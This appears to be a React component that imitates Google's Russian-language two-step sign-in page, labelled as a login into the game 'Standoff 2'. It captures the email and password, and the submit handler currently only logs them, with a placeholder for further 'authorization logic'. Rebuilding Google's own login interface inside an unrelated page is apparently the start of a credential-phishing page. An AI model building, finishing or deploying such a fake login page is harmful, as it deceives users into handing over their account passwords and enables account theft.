import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import Logo from "@/components/Logo";

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState<"email" | "password">("email");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (step === "email") {
      if (email) {
        setStep("password");
      }
    } else {
      console.log("Login submitted:", { email, password });
      // Здесь будет логика авторизации
    }
  };

  return (
    <div className="min-h-screen bg-background flex flex-col">
      {/* Header */}
      <header className="border-b border-border px-6 py-4 flex items-center gap-4">
        <Logo />
        <span className="text-foreground text-xl">Вход через аккаунт Google</span>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-start justify-center pt-12 px-4">
        <div className="w-full max-w-md">
          <h1 className="text-5xl font-normal text-foreground mb-6">Вход</h1>
          
          {step === "email" ? (
            <>
              <p className="text-foreground mb-10">
                Переход в приложение "<span className="text-primary">Standoff 2</span>"
              </p>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div>
                  <Input
                    type="text"
                    placeholder="Телефон или адрес эл. почты"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full h-14 bg-input border-border text-foreground placeholder:text-muted-foreground rounded-lg px-4 focus:border-primary focus:ring-1 focus:ring-primary"
                  />
                </div>

                <a href="#" className="text-primary text-sm hover:underline inline-block">
                  Забыли адрес электронной почты?
                </a>

                <p className="text-muted-foreground text-sm leading-relaxed">
                  Это не ваш компьютер? Используйте гостевой режим для конфиденциального входа в систему.{" "}
                  <a href="#" className="text-primary hover:underline">
                    Подробнее о гостевом режиме
                  </a>
                </p>

                <div className="flex justify-between items-center pt-8">
                  <Button
                    type="button"
                    variant="ghost"
                    className="text-primary hover:bg-secondary hover:text-primary"
                  >
                    Создать аккаунт
                  </Button>
                  
                  <Button
                    type="submit"
                    className="bg-primary text-primary-foreground hover:bg-primary/90 px-8 rounded-full"
                  >
                    Далее
                  </Button>
                </div>
              </form>
            </>
          ) : (
            <>
              <div className="flex items-center gap-3 mb-10 p-4 border border-border rounded-lg">
                <div className="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center text-primary font-semibold">
                  {email[0]?.toUpperCase()}
                </div>
                <div>
                  <div className="text-foreground">{email}</div>
                  <button
                    type="button"
                    onClick={() => setStep("email")}
                    className="text-primary text-sm hover:underline"
                  >
                    Сменить аккаунт
                  </button>
                </div>
              </div>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div>
                  <Input
                    type="password"
                    placeholder="Введите пароль"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full h-14 bg-input border-border text-foreground placeholder:text-muted-foreground rounded-lg px-4 focus:border-primary focus:ring-1 focus:ring-primary"
                  />
                </div>

                <a href="#" className="text-primary text-sm hover:underline inline-block">
                  Забыли пароль?
                </a>

                <p className="text-muted-foreground text-sm leading-relaxed">
                  Чтобы защитить ваш аккаунт, убедитесь, что это действительно вы пытаетесь войти.
                </p>

                <div className="flex justify-between items-center pt-8">
                  <Button
                    type="button"
                    variant="ghost"
                    onClick={() => setStep("email")}
                    className="text-primary hover:bg-secondary hover:text-primary"
                  >
                    Назад
                  </Button>
                  
                  <Button
                    type="submit"
                    className="bg-primary text-primary-foreground hover:bg-primary/90 px-8 rounded-full"
                  >
                    Далее
                  </Button>
                </div>
              </form>
            </>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="px-6 py-4">
        <div className="flex items-center justify-between max-w-7xl mx-auto">
          <div className="relative">
            <select className="bg-transparent text-muted-foreground border-none outline-none cursor-pointer appearance-none pr-6">
              <option>Русский</option>
              <option>English</option>
              <option>Español</option>
            </select>
            <svg
              className="absolute right-0 top-1/2 -translate-y-1/2 pointer-events-none"
              width="20"
              height="20"
              viewBox="0 0 20 20"
              fill="currentColor"
            >
              <path d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" />
            </svg>
          </div>
          
          <div className="flex gap-6">
            <a href="#" className="text-muted-foreground text-sm hover:text-foreground">
              Справка
            </a>
            <a href="#" className="text-muted-foreground text-sm hover:text-foreground">
              Конфиденциальность
            </a>
            <a href="#" className="text-muted-foreground text-sm hover:text-foreground">
              Условия
            </a>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Login;
